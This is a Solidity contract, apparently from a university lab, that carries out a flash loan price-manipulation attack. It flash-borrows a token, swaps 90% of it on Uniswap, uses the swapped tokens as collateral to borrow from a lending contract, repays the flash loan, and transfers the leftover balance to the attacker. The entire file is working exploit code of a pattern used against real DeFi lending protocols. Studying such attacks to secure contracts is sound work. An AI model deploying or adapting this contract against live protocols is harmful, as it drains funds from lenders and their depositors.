// SPDX-License-Identifier: UZH
pragma solidity ^0.8.0;

import "./IERC3156FlashLender.sol";
import "../IERC20.sol";
import "../../dependencies/uniswap-v2/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "../collateral-loan/ICollateralLoan.sol";

// The borrower implementation
contract FlashBorrower is IERC3156FlashBorrower {
    IERC3156FlashLender _lender;
    address _uniswapRouterAddress;
    address _collateralLoanAddress;
    address _tokenToSwap;

    constructor (IERC3156FlashLender lender, address uniswapRouterAddress, address collateralLoanAddress) {
        _lender = lender;
        _uniswapRouterAddress = uniswapRouterAddress;
        _collateralLoanAddress = collateralLoanAddress;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(address initiator, address tokenToFlashLoan, uint256 amountToFlashLoan, uint256 fee) external override returns(bytes32) {
        require(msg.sender == address(_lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");

        // 1. swap on uniswap
        uint amountToSwap = (amountToFlashLoan / 100) * 90; // 90% of amountToFlashLoan
        address[] memory path = new address[](2);
        path[0] = tokenToFlashLoan;
        path[1] = _tokenToSwap;
        
        IERC20(tokenToFlashLoan).approve(_uniswapRouterAddress, amountToSwap);
        IUniswapV2Router02(_uniswapRouterAddress).swapExactTokensForTokens(
            amountToSwap,
            1000000000000000000,
            path,
            address(this),
            block.timestamp + 100
        );
        
        // 2. take loan given collateral
        address tokenToBorrow = tokenToFlashLoan;
        address tokenAsCollateral = _tokenToSwap;
        uint collateralAmount = IERC20(tokenAsCollateral).balanceOf(address(this));
        IERC20(tokenAsCollateral).approve(_collateralLoanAddress, collateralAmount);
        ICollateralLoan(_collateralLoanAddress).loan(tokenToBorrow, tokenAsCollateral, collateralAmount);
        
        // 3. approve amount (for repaying the flash loan)
        uint256 allowance = IERC20(tokenToFlashLoan).allowance(address(this), address(_lender));
        uint256 repayment = amountToFlashLoan + fee;
        uint256 amountToRepay = allowance + repayment;
        IERC20(tokenToFlashLoan).approve(address(_lender), amountToRepay);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan attack
    function flashLoanAttack(address tokenToFlashLoan, uint256 amountToFlashLoan, address tokenToSwap) public {
        _tokenToSwap = tokenToSwap;
        _lender.flashLoan(this, tokenToFlashLoan, amountToFlashLoan);

        // 4. transfer positive delta to attacker (if there is one)
        IERC20(tokenToFlashLoan).transfer(msg.sender, IERC20(tokenToFlashLoan).balanceOf(address(this)));
    }
    
}

